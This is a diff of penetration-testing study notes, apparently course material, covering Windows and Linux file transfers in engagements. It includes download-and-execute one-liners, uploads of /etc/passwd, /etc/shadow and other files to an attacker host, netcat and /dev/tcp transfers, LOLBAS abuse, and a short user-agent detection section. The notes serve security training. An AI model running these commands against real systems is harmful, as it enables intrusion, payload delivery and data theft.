@@ -1,297 +1,300 @@
-# File Transfers
+## Setting the Stage
 
-## File Transfers
+Example engagement chaining a web shell, blocked PowerShell, SeImpersonatePrivilege and an SMB transfer to escalate privileges.
 
-The problem in a real engagement: RCE on IIS, PowerShell blocked by AppLocker, outbound web filtered, FTP blocked on 21 — but SMB on 445 was allowed. File transfer method choice depends on what's blocked vs allowed. Host controls (whitelisting, AV/EDR) and network controls (firewall, IDS/IPS) both gate the technique.
+PowerUp.ps1: https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1  
+Application Control Policy: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/windows-defender-application-control  
+SeImpersonatePrivilege: https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege  
+PrintSpoofer: https://github.com/itm4n/PrintSpoofer  
+Certutil: https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil  
+Impacket smbserver: https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py
 
 ## Windows File Transfer Methods
-![[Pasted image 20261024044855.png]]
+
+Native Windows tools for download and upload operations.
+
 ### Download Operations
 
-**PowerShell Base64 Encode & Decode** — no network needed, useful when nothing else gets through.
+#### PowerShell Base64 Encode & Decode
 
 ```bash
-# On attack host: encode, verify hash
-md5sum id_rsa
-cat id_rsa | base64 -w 0; echo
+md5sum <FILE>
+cat <FILE> | base64 -w 0; echo
 ```
 
 ```powershell
-# On Windows: decode, verify hash
-[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<BASE64_STRING>"))
-Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
+[IO.File]::WriteAllBytes("<OUTPUT_FILE>", [Convert]::FromBase64String("<BASE64_STRING>"))
+Get-FileHash <OUTPUT_FILE> -Algorithm md5
 ```
 
-cmd.exe caps at 8,191 chars per command; large base64 strings break the paste.
+Gotcha: cmd.exe caps strings at 8,191 chars, large strings may also break a web shell.
 
-**PowerShell Web Downloads**
+#### PowerShell Web Downloads
 
-Most networks allow HTTP/HTTPS outbound. `Net.WebClient` is available in every PowerShell version.
+Net.WebClient / Invoke-WebRequest over HTTP, HTTPS or FTP.
 
 ```powershell
-# DownloadFile (sync / async)
 (New-Object Net.WebClient).DownloadFile('<URL>','<OUTPUT_FILE>')
 (New-Object Net.WebClient).DownloadFileAsync('<URL>','<OUTPUT_FILE>')
-
-# Fileless: DownloadString + IEX
-IEX (New-Object Net.WebClient).DownloadString('<URL>')
+IEX (New-Object Net.WebClient).DownloadString('<URL>') # fileless, runs in memory
 (New-Object Net.WebClient).DownloadString('<URL>') | IEX
-
-# Invoke-WebRequest (aliases: iwr, curl, wget)
-Invoke-WebRequest <URL> -OutFile <OUTPUT_FILE>
+Invoke-WebRequest <URL> -OutFile <OUTPUT_FILE> # aliases: iwr, curl, wget
+Invoke-WebRequest <URL> -UseBasicParsing | IEX # fix IE first-launch error
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true} # fix SSL/TLS trust error
 ```
 
-Common errors worth knowing:
+Harmj0y's PowerShell download cradle list covers proxy-awareness and disk-touching tradeoffs for each method.
 
-```powershell
-# IE first-launch config incomplete → -UseBasicParsing
-Invoke-WebRequest <URL> -UseBasicParsing | IEX
+#### SMB Downloads
 
-# SSL/TLS trust error → disable cert validation for the session
-[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
-```
-
-**SMB Downloads** — common in enterprise, TCP/445 usually allowed outbound.
+SMB protocol, TCP/445.
 
 ```bash
-# Attack host: unauthenticated share
-sudo impacket-smbserver share -smb2support /tmp/smbshare
-
-# With credentials (needed when Windows blocks guest access)
-sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
+sudo impacket-smbserver <SHARE> -smb2support <DIR>
+sudo impacket-smbserver <SHARE> -smb2support <DIR> -user <USERNAME> -password <PASSWORD>
 ```
 
 ```cmd
-copy \\<ATTACKER_IP>\share\nc.exe
-
-:: If guest blocked, mount with credentials
-net use n: \\<ATTACKER_IP>\share /user:test test
-copy n:\nc.exe
+copy \\<ATTACKER_IP>\<SHARE>\<FILE>
+net use n: \\<ATTACKER_IP>\<SHARE> /user:<USERNAME> <PASSWORD>
+copy n:\<FILE>
 ```
 
-**FTP Downloads** — TCP 21, often blocked outbound but simple to stand up.
+Gotcha: newer Windows blocks unauthenticated guest SMB, use an authenticated share or mount with `net use`.
+
+#### FTP Downloads
+
+FTP: control TCP/21, data TCP/20.
 
 ```bash
 sudo pip3 install pyftpdlib
-sudo python3 -m pyftpdlib --port 21
+sudo python3 -m pyftpdlib --port 21 # anonymous auth by default
 ```
 
 ```powershell
-(New-Object Net.WebClient).DownloadFile('ftp://<ATTACKER_IP>/file.txt', 'C:\Users\Public\ftp-file.txt')
+(New-Object Net.WebClient).DownloadFile('ftp://<ATTACKER_IP>/<FILE>', '<OUTPUT_FILE>')
 ```
-
-Non-interactive FTP via command file (useful for non-interactive shells):
 
 ```cmd
 echo open <ATTACKER_IP> > ftpcommand.txt
 echo USER anonymous >> ftpcommand.txt
 echo binary >> ftpcommand.txt
-echo GET file.txt >> ftpcommand.txt
+echo GET <FILE> >> ftpcommand.txt
 echo bye >> ftpcommand.txt
 ftp -v -n -s:ftpcommand.txt
 ```
 
+Use a command file when there's no interactive shell.
+
 ### Upload Operations
 
-**PowerShell Base64 Encode & Decode**
+#### PowerShell Base64 Encode & Decode
 
 ```powershell
-# On Windows: encode
-[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
+[Convert]::ToBase64String((Get-Content -path "<FILE>" -Encoding byte))
+Get-FileHash "<FILE>" -Algorithm MD5 | select Hash
 ```
 
 ```bash
-# On attack host: decode, verify
-echo <BASE64_STRING> | base64 -d > hosts
-md5sum hosts
+echo <BASE64_STRING> | base64 -d > <OUTPUT_FILE>
+md5sum <OUTPUT_FILE>
 ```
 
-**PowerShell Web Uploads** — needs a server that accepts uploads.
+#### PowerShell Web Uploads
+
+PowerShell has no built-in upload function, build one with Invoke-WebRequest/Invoke-RestMethod against a server that accepts uploads.
 
 ```bash
 pip3 install uploadserver
-python3 -m uploadserver
+python3 -m uploadserver # file upload at /upload
 ```
 
 ```powershell
-IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
-Invoke-FileUpload -Uri http://<ATTACKER_IP>:8000/upload -File C:\Windows\System32\drivers\etc\hosts
+IEX(New-Object Net.WebClient).DownloadString('<PSUpload.ps1 URL>')
+Invoke-FileUpload -Uri http://<ATTACKER_IP>:8000/upload -File <FILE>
 ```
 
-Base64 upload over Netcat:
+PSUpload.ps1: https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1
+
+Base64 variant with Netcat as the catcher:
 
 ```powershell
-$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
+$b64 = [System.convert]::ToBase64String((Get-Content -Path '<FILE>' -Encoding Byte))
 Invoke-WebRequest -Uri http://<ATTACKER_IP>:8000/ -Method POST -Body $b64
 ```
 
 ```bash
 nc -lvnp 8000
-# Copy the POST body, then decode
-echo <BASE64> | base64 -d -w 0 > hosts
+echo <BASE64> | base64 -d -w 0 > <OUTPUT_FILE>
 ```
 
-**SMB Uploads (WebDAV)** — when outbound 445 is blocked but HTTP is allowed. SMB falls back to HTTP automatically.
+#### SMB Uploads
+
+WebDAV (RFC 4918) extends HTTP so SMB falls back to it when TCP/445 is blocked outbound; also works over HTTPS.
 
 ```bash
 sudo pip3 install wsgidav cheroot
-sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
+sudo wsgidav --host=0.0.0.0 --port=80 --root=<DIR> --auth=anonymous
 ```
 
 ```cmd
 dir \\<ATTACKER_IP>\DavWWWRoot
-copy C:\Users\john\Desktop\SourceCode.zip \\<ATTACKER_IP>\DavWWWRoot\
+copy <FILE> \\<ATTACKER_IP>\DavWWWRoot\
+copy <FILE> \\<ATTACKER_IP>\<SHARE>\
 ```
 
-`DavWWWRoot` is a Windows keyword for the WebDAV root — not a real folder on the server. You can also connect to a real folder directly (`\\<IP>\sharefolder`).
+Gotcha: DavWWWRoot is a Mini-Redirector keyword, not a real folder, point at an existing share to skip it.  
+Note: with no SMB (445) restriction, use impacket-smbserver as in the download section.
 
-**FTP Uploads**
+#### FTP Uploads
 
 ```bash
 sudo python3 -m pyftpdlib --port 21 --write
 ```
 
 ```powershell
-(New-Object Net.WebClient).UploadFile('ftp://<ATTACKER_IP>/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
+(New-Object Net.WebClient).UploadFile('ftp://<ATTACKER_IP>/<OUTPUT_FILE>', '<FILE>')
 ```
-
-FTP command file:
 
 ```cmd
 echo open <ATTACKER_IP> > ftpcommand.txt
 echo USER anonymous >> ftpcommand.txt
 echo binary >> ftpcommand.txt
-echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
+echo PUT <FILE> >> ftpcommand.txt
 echo bye >> ftpcommand.txt
 ftp -v -n -s:ftpcommand.txt
 ```
 
 ## Linux File Transfer Methods
 
+Native Linux tools and protocols for file transfer: HTTP, Bash, SSH, etc.
+
 ### Download Operations
 
-**Base64 Encoding / Decoding**
+#### Base64 Encoding / Decoding
 
 ```bash
-md5sum id_rsa
-cat id_rsa | base64 -w 0; echo
-
-# On target
-echo -n '<BASE64_STRING>' | base64 -d > id_rsa
-md5sum id_rsa
+md5sum <FILE>
+cat <FILE> | base64 -w 0; echo
+echo -n '<BASE64_STRING>' | base64 -d > <OUTPUT_FILE>
+md5sum <OUTPUT_FILE>
 ```
 
-**Web Downloads with Wget and cURL**
+Note: reverse this (cat + base64 on target, decode on Pwnbox) to upload instead.
+
+#### Web Downloads with Wget and cURL
 
 ```bash
-wget <URL> -O /tmp/LinEnum.sh
-curl -o /tmp/LinEnum.sh <URL>
+wget <URL> -O <OUTPUT_FILE>
+curl -o <OUTPUT_FILE> <URL>
 ```
 
-**Fileless Attacks**
-
-Piping into an interpreter avoids touching disk — though some payloads (e.g. `mkfifo`) still write temp files.
+#### Fileless Attacks Using Linux
 
 ```bash
 curl <URL> | bash
 wget -qO- <URL> | python3
 ```
 
-**Download with Bash (/dev/tcp)**
+LinEnum.sh: https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh  
+helloworld.py: https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py
 
-Works on Bash ≥2.04 with `--enable-net-redirections`. Useful when no download tool is available.
+Gotcha: payloads like mkfifo still write temp files to disk even though execution is fileless.
+
+#### Download with Bash (/dev/tcp)
+
+Condition: Bash ≥2.04 compiled with --enable-net-redirections, no other transfer tool available.
 
 ```bash
-exec 3<>/dev/tcp/<TARGET_IP>/80
-echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
+exec 3<>/dev/tcp/<TARGET_IP>/<PORT>
+echo -e "GET /<FILE> HTTP/1.1\n\n">&3
 cat <&3
 ```
 
-**SSH Downloads (SCP)**
+#### SSH Downloads
+
+SCP: secure file copy over the SSH protocol.
 
 ```bash
 sudo systemctl enable ssh
 sudo systemctl start ssh
 netstat -lnpt
-
-scp <USERNAME>@<TARGET_IP>:/root/myroot.txt .
 ```
+
+```bash
+scp <USERNAME>@<ATTACKER_IP>:<FILE> .
+```
+
+Use a temp user account instead of primary creds/keys for transfers.
 
 ### Upload Operations
 
-**Web Upload (HTTPS)**
+#### Web Upload
 
 ```bash
 sudo python3 -m pip install --user uploadserver
 openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
-mkdir https && cd https
-sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
+sudo python3 -m uploadserver 443 --server-certificate server.pem
 ```
 
 ```bash
-# From target: upload multiple files
-curl -X POST https://<ATTACKER_IP>/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
+curl -X POST https://<ATTACKER_IP>/upload -F 'files=@<FILE>' -F 'files=@<FILE_2>' --insecure
 ```
 
-**Alternative Web File Transfer** — spin up a mini web server from whatever language is available on target.
+#### Alternative Web File Transfer Method
 
 ```bash
 python3 -m http.server
 python2.7 -m SimpleHTTPServer
-php -S 0.0.0.0:8000
-ruby -run -ehttpd . -p8000
+php -S 0.0.0.0:<PORT>
+ruby -run -ehttpd . -p<PORT>
 ```
 
 ```bash
-# From attack host: pull the file
-wget <TARGET_IP>:8000/filetotransfer.txt
+wget <ATTACKER_IP>:<PORT>/<FILE>
 ```
 
-**SCP Upload**
+Gotcha: inbound traffic to the new web server may be blocked; this downloads from target to attack host, it is not an upload.
+
+#### SCP Upload
+
+Condition: outbound SSH (TCP/22) allowed.
 
 ```bash
-scp /etc/passwd <USERNAME>@<TARGET_IP>:/home/<USERNAME>/
+scp <FILE> <USERNAME>@<TARGET_IP>:<REMOTE_PATH>
 ```
 
 ## Transferring Files with Code
 
-Python, PHP, Perl, Ruby are commonly available on Linux targets and occasionally on Windows. `cscript` and `mshta` run JavaScript/VBScript on Windows.
+Use scripting languages on target to download, upload or execute files when native tools are unavailable.
 
-**Python**
+### Python
 
 ```bash
-python2.7 -c 'import urllib;urllib.urlretrieve("<URL>", "<OUTPUT_FILE>")'
+python2.7 -c 'import urllib;urllib.urlretrieve ("<URL>", "<OUTPUT_FILE>")'
 python3 -c 'import urllib.request;urllib.request.urlretrieve("<URL>", "<OUTPUT_FILE>")'
 ```
 
-**PHP**
+### PHP
 
 ```bash
 php -r '$file = file_get_contents("<URL>"); file_put_contents("<OUTPUT_FILE>",$file);'
-
 php -r 'const BUFFER = 1024; $fremote = fopen("<URL>", "rb"); $flocal = fopen("<OUTPUT_FILE>", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
-
 php -r '$lines = @file("<URL>"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
 ```
 
-`@file` accepts URLs as filenames only if fopen wrappers are enabled.
+Note: URL can be used as a filename with `@file` only if fopen wrappers are enabled.
 
-**Ruby**
+### Other Languages
 
 ```bash
 ruby -e 'require "net/http"; File.write("<OUTPUT_FILE>", Net::HTTP.get(URI.parse("<URL>")))'
-```
-
-**Perl**
-
-```bash
 perl -e 'use LWP::Simple; getstore("<URL>", "<OUTPUT_FILE>");'
 ```
 
-**JavaScript (Windows)**
+### JavaScript
 
 ```javascript
-// wget.js
 var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
 WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
 WinHttpReq.Send();
@@ -306,14 +309,16 @@ BinStream.SaveToFile(WScript.Arguments(1));
 cscript.exe /nologo wget.js <URL> <OUTPUT_FILE>
 ```
 
-**VBScript (Windows)**
+### VBScript
+
+Installed by default on every Windows desktop release since Windows 98.
 
 ```vbscript
-' wget.vbs
 dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
 dim bStrm: Set bStrm = createobject("Adodb.Stream")
 xHttp.Open "GET", WScript.Arguments.Item(0), False
 xHttp.Send
+
 with bStrm
     .type = 1
     .open
@@ -326,123 +331,248 @@ end with
 cscript.exe /nologo wget.vbs <URL> <OUTPUT_FILE>
 ```
 
-**Upload Operations using Python3**
+### Upload Operations using Python3
 
 ```bash
 python3 -m uploadserver
 ```
 
 ```bash
-python3 -c 'import requests;requests.post("http://<ATTACKER_IP>:8000/upload",files={"files":open("/etc/passwd","rb")})'
+python3 -c 'import requests;requests.post("<URL>",files={"files":open("<FILE>","rb")})'
 ```
 
 ## Miscellaneous File Transfer Methods
 
-### Netcat / Ncat
+Alternative transfer methods: Netcat/Ncat, PowerShell Remoting (WinRM) sessions, and RDP.
 
-Direction of connection depends on which side the firewall permits. Ncat is a modern reimplementation with `--send-only` / `--recv-only` to close cleanly when the transfer completes.
+### Netcat
+
+Reads/writes TCP or UDP connections. Ncat adds SSL, IPv6, SOCKS/HTTP proxy support.
+
+Listen on target, send from attack host:
 
 ```bash
-# Target listening — original nc
-nc -l -p 8000 > SharpKatz.exe
-
-# Target listening — Ncat, closes once received
-ncat -l -p 8000 --recv-only > SharpKatz.exe
+nc -l -p <PORT> > <OUTPUT_FILE>
+ncat -l -p <PORT> --recv-only > <OUTPUT_FILE> # closes conn when done
 ```
 
 ```bash
-# Attack host sending — original nc
-nc -q 0 <TARGET_IP> 8000 < SharpKatz.exe
-
-# Attack host sending — Ncat
-ncat --send-only <TARGET_IP> 8000 < SharpKatz.exe
+nc -q 0 <TARGET_IP> <PORT> < <FILE> # -q 0 closes conn after send
+ncat --send-only <TARGET_IP> <PORT> < <FILE>
 ```
 
-Reverse direction — attack host listens, target connects (useful when target blocks inbound):
+Listen on attack host instead (useful if inbound blocked on target), target connects:
 
 ```bash
-sudo nc -l -p 443 -q 0 < SharpKatz.exe
-# target:
-nc <ATTACKER_IP> 443 > SharpKatz.exe
-
-sudo ncat -l -p 443 --send-only < SharpKatz.exe
-# target:
-ncat <ATTACKER_IP> 443 --recv-only > SharpKatz.exe
+sudo nc -l -p <PORT> -q 0 < <FILE>
+sudo ncat -l -p <PORT> --send-only < <FILE>
 ```
-
-No nc on target? Bash `/dev/tcp`:
 
 ```bash
-cat < /dev/tcp/<ATTACKER_IP>/443 > SharpKatz.exe
+nc <ATTACKER_IP> <PORT> > <OUTPUT_FILE>
+ncat <ATTACKER_IP> <PORT> --recv-only > <OUTPUT_FILE>
 ```
 
-### PowerShell Session File Transfer (WinRM)
+No netcat/ncat on target:
 
-HTTP 5985 / HTTPS 5986. Needs admin, Remote Management Users, or explicit permissions.
+```bash
+cat < /dev/tcp/<ATTACKER_IP>/<PORT> > <OUTPUT_FILE>
+```
+
+### PowerShell Session File Transfer
+
+WinRM: HTTP TCP/5985, HTTPS TCP/5986. Needs admin rights, Remote Management Users membership, or explicit PS Remoting permission.
 
 ```powershell
-Test-NetConnection -ComputerName <TARGET_HOST> -Port 5985
-$Session = New-PSSession -ComputerName <TARGET_HOST>
-
-# To remote
-Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
-
-# From remote
-Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
+Test-NetConnection -ComputerName <TARGET> -Port 5985
+$Session = New-PSSession -ComputerName <TARGET>
+Copy-Item -Path <FILE> -ToSession $Session -Destination <REMOTE_PATH>
+Copy-Item -Path <REMOTE_FILE> -Destination <LOCAL_PATH> -FromSession $Session
 ```
 
 ### RDP
 
-Copy/paste inside the session, or mount a local drive.
+Copy/paste into the RDP session, or mount a local resource as a drive.
 
 ```bash
-rdesktop <TARGET_IP> -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
-
-xfreerdp /v:<TARGET_IP> /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
+rdesktop <TARGET_IP> -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' -r disk:linux='<LOCAL_DIR>'
+xfreerdp /v:<TARGET_IP> /d:<DOMAIN> /u:<USERNAME> /p:'<PASSWORD>' /drive:linux,<LOCAL_DIR>
 ```
-![[Pasted image 20261024045059.png]]
-Access via `\\tsclient\` in the remote session. The share isn't accessible to other logged-in users.
-![[Pasted image 20261024045118.png]]
+
+Access the mounted drive via `\\tsclient\` inside the session.  
+Gotcha: the drive isn't accessible to other users on target, even if they hijack the RDP session.
+
 ## Protected File Transfers
 
-Don't exfiltrate real PII / financial data / trade secrets unless explicitly requested. For DLP testing, use dummy files that mimic the protected data. Encrypt before transfer when the transport isn't already encrypted.
+Encrypt sensitive data before transfer when SSH/SFTP/HTTPS are unavailable, to avoid plaintext interception.
 
-### Windows — Invoke-AESEncryption.ps1
+Note: don't exfiltrate real PII/financial data during testing, use dummy data to test DLP/egress controls instead.
+
+### File Encryption on Windows
+
+Invoke-AESEncryption.ps1: lightweight PowerShell AES-256-CBC encryption for files or strings.
+
+```powershell
+
+.EXAMPLE
+Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Text "Secret Text" 
+
+Description
+-----------
+Encrypts the string "Secret Test" and outputs a Base64 encoded ciphertext.
+ 
+.EXAMPLE
+Invoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Text "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs="
+ 
+Description
+-----------
+Decrypts the Base64 encoded string "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs=" and outputs plain text.
+ 
+.EXAMPLE
+Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Path file.bin
+ 
+Description
+-----------
+Encrypts the file "file.bin" and outputs an encrypted file "file.bin.aes"
+ 
+.EXAMPLE
+Invoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Path file.bin.aes
+ 
+Description
+-----------
+Decrypts the file "file.bin.aes" and outputs the decrypted file "file.bin"
+#>
+function Invoke-AESEncryption {
+    [CmdletBinding()]
+    [OutputType([string])]
+    Param
+    (
+        [Parameter(Mandatory = $true)]
+        [ValidateSet('Encrypt', 'Decrypt')]
+        [String]$Mode,
+
+        [Parameter(Mandatory = $true)]
+        [String]$Key,
+
+        [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
+        [String]$Text,
+
+        [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
+        [String]$Path
+    )
+
+    Begin {
+        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
+        $aesManaged = New-Object System.Security.Cryptography.AesManaged
+        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
+        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
+        $aesManaged.BlockSize = 128
+        $aesManaged.KeySize = 256
+    }
+
+    Process {
+        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))
+
+        switch ($Mode) {
+            'Encrypt' {
+                if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}
+                
+                if ($Path) {
+                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
+                    if (!$File.FullName) {
+                        Write-Error -Message "File not found!"
+                        break
+                    }
+                    $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
+                    $outPath = $File.FullName + ".aes"
+                }
+
+                $encryptor = $aesManaged.CreateEncryptor()
+                $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
+                $encryptedBytes = $aesManaged.IV + $encryptedBytes
+                $aesManaged.Dispose()
+
+                if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}
+                
+                if ($Path) {
+                    [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
+                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
+                    return "File encrypted to $outPath"
+                }
+            }
+
+            'Decrypt' {
+                if ($Text) {$cipherBytes = [System.Convert]::FromBase64String($Text)}
+                
+                if ($Path) {
+                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
+                    if (!$File.FullName) {
+                        Write-Error -Message "File not found!"
+                        break
+                    }
+                    $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
+                    $outPath = $File.FullName -replace ".aes"
+                }
+
+                $aesManaged.IV = $cipherBytes[0..15]
+                $decryptor = $aesManaged.CreateDecryptor()
+                $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
+                $aesManaged.Dispose()
+
+                if ($Text) {return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)}
+                
+                if ($Path) {
+                    [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
+                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
+                    return "File decrypted to $outPath"
+                }
+            }
+        }
+    }
+
+    End {
+        $shaManaged.Dispose()
+        $aesManaged.Dispose()
+    }
+}
+```
 
 ```powershell
 Import-Module .\Invoke-AESEncryption.ps1
-
-Invoke-AESEncryption -Mode Encrypt -Key "<KEY>" -Path .\scan-results.txt
-# → scan-results.txt.aes
-
-Invoke-AESEncryption -Mode Decrypt -Key "<KEY>" -Path .\scan-results.txt.aes
+Invoke-AESEncryption -Mode Encrypt -Key "<PASSWORD>" -Path <FILE> # outputs <FILE>.aes
 ```
 
-Use a strong, unique key per engagement — a single leaked key otherwise decrypts everything.
+Use a strong, unique password per engagement, reuse risks mass decryption if one password leaks.
 
-### Linux — OpenSSL
+### File Encryption on Linux
+
+openssl AES-256 file encryption with PBKDF2 key derivation.
 
 ```bash
-openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
-openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
+openssl enc -aes256 -iter 100000 -pbkdf2 -in <FILE> -out <OUTPUT_FILE>.enc
+openssl enc -d -aes256 -iter 100000 -pbkdf2 -in <FILE>.enc -out <OUTPUT_FILE>
 ```
-
-Transfer the encrypted file over HTTPS/SFTP/SSH where possible.
 
 ## Catching Files over HTTP/S
 
-HTTP/HTTPS are almost always allowed and encrypt in transit. For a controlled upload endpoint, prefer Nginx over Apache — Nginx doesn't execute PHP by default, so a misjudged PUT can't become a web shell.
+Stand up a secure Nginx server to receive file uploads over HTTP/HTTPS via PUT.
+
+### Nginx - Enabling PUT
+
+Gotcha: Apache + PHP will happily execute an uploaded webshell, Nginx is safer and simpler to configure for this.
 
 ```bash
-sudo mkdir -p /var/www/uploads/SecretUploadDirectory
-sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
+sudo mkdir -p /var/www/uploads/<UPLOAD_DIR>
+sudo chown -R www-data:www-data /var/www/uploads/<UPLOAD_DIR>
 ```
 
+`/etc/nginx/sites-available/upload.conf`:
+
 ```nginx
-# /etc/nginx/sites-available/upload.conf
 server {
-    listen 9001;
-    location /SecretUploadDirectory/ {
+    listen <PORT>;
+
+    location /<UPLOAD_DIR>/ {
         root    /var/www/uploads;
         dav_methods PUT;
     }
@@ -451,97 +581,104 @@ server {
 
 ```bash
 sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
+sudo rm /etc/nginx/sites-enabled/default # free port 80 if already bound
 sudo systemctl restart nginx.service
-
-# If port 80 is taken, remove the default site
-sudo rm /etc/nginx/sites-enabled/default
 ```
-
-Upload via PUT:
 
 ```bash
-curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt
+curl -T <FILE> http://localhost:<PORT>/<UPLOAD_DIR>/<OUTPUT_FILE>
 ```
 
-Confirm directory listing is off — anything exfiltrated this way is sensitive, and Nginx doesn't enable listings by default.
+Gotcha: an exposed directory with no index file lists all uploaded files; Nginx disables listing by default, Apache does not.
 
 ## Living off The Land
 
-**LOLBAS** (Windows) and **GTFOBins** (Linux) catalogue binaries that can be abused for download, upload, command execution, file read/write, and bypasses beyond their intended purpose.
+LOLBins/GTFOBins: legitimate OS binaries abused for download, upload, execution, file read/write and bypasses, useful against application whitelisting.
 
-**CertReq.exe (LOLBAS — upload)**
+LOLBAS: https://lolbas-project.github.io/  
+GTFOBins: https://gtfobins.github.io/
 
-Listen with Netcat, then execute on target to POST the file:
+### Using the LOLBAS and GTFOBins Project
+
+`LOLBAS search` `/download` `/upload` | `GTFOBins search` `+file download` `+file upload`
+
+#### LOLBAS
 
 ```cmd
-certreq.exe -Post -config http://<ATTACKER_IP>:8000/ c:\windows\win.ini
+certreq.exe -Post -config http://<ATTACKER_IP>:<PORT>/ <FILE>
 ```
 
-```bash
-sudo nc -lvnp 8000
-# POST body contains the file
-```
+Catch with a Netcat listener on the attack host. Gotcha: some certreq.exe builds lack `-Post`, needs an updated version.
 
-Requires a `certreq.exe` version with `-Post`.
-
-**OpenSSL (GTFOBins — send/receive over TLS)**
+#### GTFOBins
 
 ```bash
 openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
-openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
+openssl s_server -quiet -accept <PORT> -cert certificate.pem -key key.pem < <FILE>
 ```
 
 ```bash
-# Target pulls the file
-openssl s_client -connect <ATTACKER_IP>:80 -quiet > LinEnum.sh
+openssl s_client -connect <TARGET_IP>:<PORT> -quiet > <OUTPUT_FILE>
 ```
 
-**Bitsadmin / Start-BitsTransfer (Windows)**
+### Other Common Living off the Land tools
 
-```powershell
-bitsadmin /transfer wcb /priority foreground http://<ATTACKER_IP>:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
+#### Bitsadmin
 
-Import-Module bitstransfer
-Start-BitsTransfer -Source "http://<ATTACKER_IP>:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
-```
-
-**Certutil (Windows)**
+BITS intelligently throttles to minimize impact on foreground user activity.
 
 ```cmd
-certutil.exe -verifyctl -split -f http://<ATTACKER_IP>:8000/nc.exe
+bitsadmin /transfer <JOB_NAME> /priority foreground <URL> <OUTPUT_FILE>
 ```
 
-AMSI detects this as malicious certutil usage on modern Windows.
+```powershell
+Import-Module bitstransfer; Start-BitsTransfer -Source "<URL>" -Destination "<OUTPUT_FILE>"
+```
+
+#### Certutil
+
+```cmd
+certutil.exe -verifyctl -split -f <URL>
+```
+
+Gotcha: AMSI currently flags this as malicious Certutil usage.
 
 ## Detection
 
-User agent strings are the primary detection surface. Every HTTP client sends one; common file transfer techniques produce distinctive agents.
+User-Agent strings fingerprint HTTP clients and can reveal file transfer tools used by an attacker.
 
-- **Invoke-WebRequest** — `WindowsPowerShell/5.1.14393.0`
